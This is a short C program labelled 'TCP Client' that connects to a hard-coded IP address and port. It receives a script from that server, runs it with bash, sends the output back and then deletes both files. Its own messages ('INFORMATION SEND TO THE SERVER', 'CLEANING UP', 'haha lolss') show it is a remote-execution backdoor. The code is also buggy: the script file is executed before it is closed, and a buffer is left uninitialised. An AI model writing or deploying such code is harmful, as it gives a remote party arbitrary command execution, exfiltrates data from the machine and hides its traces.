// coder   : Himanshu Mishra
// Program : TCP Client

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <stdlib.h>

#define PORT_NUM 2035
#define SERVER_IP_ADDRS "100.97.221.153"

int main()  {
    int clientsockid;
    int serversockaddr_len;

    int count=0;

    struct sockaddr_in serversocketaddress;

    clientsockid = socket(AF_INET, SOCK_STREAM, 0);

    serversocketaddress.sin_family = AF_INET;
    serversocketaddress.sin_port = htons(PORT_NUM);
    serversocketaddress.sin_addr.s_addr = inet_addr(SERVER_IP_ADDRS);
    serversockaddr_len = sizeof(serversocketaddress);

    printf("\n#INFO : Sending connection request to server for confirmation \n");

    connect(clientsockid, (struct sockaddr *)&serversocketaddress, serversockaddr_len);

    printf("\n#INFO : CONNECTED TO SERVER ... ");

    FILE *outputFile;
    outputFile = fopen("output.sh", "w");
    char in_buf[100000], ack[100], temp[100000];
    printf("\n#INFO : PERSON AT SERVER ENTERING FILENAME PLEASE WAIT");

    recv(clientsockid, in_buf, sizeof(in_buf), 0);
    fprintf(outputFile, "%s", in_buf);

    printf("\n#INFO : RECEIVED FILE");
    printf("\n#INFO : SAVING FILE ");
    printf("\n#INFO : EXECUTING FILE");

    system("bash output.sh > info.txt");
    // send the file

    FILE *file;
    char *out_buf = NULL;
    size_t len;
    char read;
    file=fopen("info.txt", "r");
    if (file == NULL)
        return 1;
    while ((read = getline(&out_buf, &len, file)) != -1) {
            // printf("%s", out_buf);
            strcat(temp, out_buf);
    }
    send(clientsockid, temp, (strlen(temp)+1), 0);
    printf("\n#INFO : INFORMATION SEND TO THE SERVER :P :P :P ");
    printf("\n#INFO : NOW CLEANING UP THE OUTPUT FILES");
    system("rm -f output.sh");
    system("rm -f info.txt");
    printf("\n#INFO : THANKS :D :D :D :D :D haha lolss");
    fclose(outputFile);
    close(clientsockid);
    return 0;
}

